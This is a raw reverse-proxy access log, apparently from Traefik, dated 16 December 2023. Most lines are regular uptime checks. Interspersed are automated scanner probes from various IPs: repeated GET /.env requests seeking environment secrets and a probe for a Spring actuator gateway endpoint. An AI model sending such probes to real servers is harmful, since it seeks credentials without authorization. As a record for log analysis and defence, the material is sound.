159.203.109.206 - - [16/Dec/2023:08:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1700 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1701 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1702 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:08:52:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1703 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:08:52:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1704 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:08:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1705 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1706 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1707 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1708 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1709 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1710 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1711 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1712 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:08:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1713 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1714 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1715 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1716 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1717 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:08:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1718 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:08:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1719 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:08:59:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1720 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [16/Dec/2023:09:00:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1721 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:09:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1722 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1723 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1724 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1725 "www@docker" "http://172.29.0.8:80" 1ms
90.151.171.108 - - [16/Dec/2023:09:01:53 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1726 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [16/Dec/2023:09:02:08 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1727 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:09:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1728 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1729 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1730 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1731 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1732 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1733 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1734 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1735 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1736 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:09:06:35 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1737 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:09:06:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1738 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1739 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1740 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1741 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1742 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1743 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1744 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1745 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1746 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1747 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1748 "www@docker" "http://172.29.0.8:80" 0ms
83.97.73.87 - - [16/Dec/2023:09:11:25 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 1749 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [16/Dec/2023:09:11:25 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1750 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1751 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1752 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1753 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1754 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1755 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1756 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1757 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1758 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1759 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1760 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1761 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1762 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1763 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1764 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1765 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1766 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1767 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1768 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1769 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1770 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1771 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1772 "www@docker" "http://172.29.0.8:80" 1ms
185.180.143.190 - - [16/Dec/2023:09:22:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1773 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1774 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1775 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1776 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1777 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1778 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1779 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1780 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1781 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1782 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1783 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1784 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1785 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1786 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1787 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1788 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1789 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1790 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1791 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1792 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1793 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1794 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1795 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1796 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1797 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1798 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1799 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1800 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1801 "www@docker" "http://172.29.0.8:80" 0ms
68.69.186.30 - - [16/Dec/2023:09:36:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1802 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1803 "www@docker" "http://172.29.0.8:80" 1ms
68.69.186.30 - - [16/Dec/2023:09:37:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1804 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:09:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1805 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1806 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1807 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1808 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1809 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1810 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1811 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1812 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1813 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1814 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1815 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1816 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1817 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1818 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1819 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1820 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1821 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:09:45:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1822 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:09:45:31 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1823 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1824 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1825 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1826 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1827 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1828 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1829 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1830 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1831 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1832 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1833 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1834 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1835 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1836 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1837 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1838 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1839 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1840 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1841 "www@docker" "http://172.29.0.8:80" 0ms
78.153.140.219 - - [16/Dec/2023:09:54:32 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1842 "-" "-" 0ms
78.153.140.219 - - [16/Dec/2023:09:54:32 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1843 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:09:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1844 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1845 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1846 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:09:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1847 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:09:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1848 "www@docker" "http://172.29.0.8:80" 0ms
34.125.10.6 - - [16/Dec/2023:09:57:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1849 "web-to-websecure@internal" "-" 0ms
34.125.10.6 - - [16/Dec/2023:09:57:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1850 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:09:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1851 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1852 "www@docker" "http://172.29.0.8:80" 1ms
192.241.227.55 - - [16/Dec/2023:09:57:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1853 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:09:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1854 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1855 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:09:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1856 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:09:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1857 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1858 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1859 "www@docker" "http://172.29.0.8:80" 0ms
167.94.145.59 - - [16/Dec/2023:10:00:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1860 "-" "-" 0ms
167.94.145.59 - - [16/Dec/2023:10:00:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1861 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1862 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1863 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1864 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1865 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1866 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1867 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1868 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1869 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1870 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1871 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1872 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1873 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:10:06:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1874 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1875 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1876 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:10:07:37 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1877 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:10:07:37 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1878 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1879 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:10:08:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1880 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1881 "www@docker" "http://172.29.0.8:80" 1ms
185.236.231.150 - - [16/Dec/2023:10:08:57 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1882 "web-to-websecure@internal" "-" 0ms
185.236.231.150 - - [16/Dec/2023:10:08:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1883 "web-to-websecure@internal" "-" 0ms
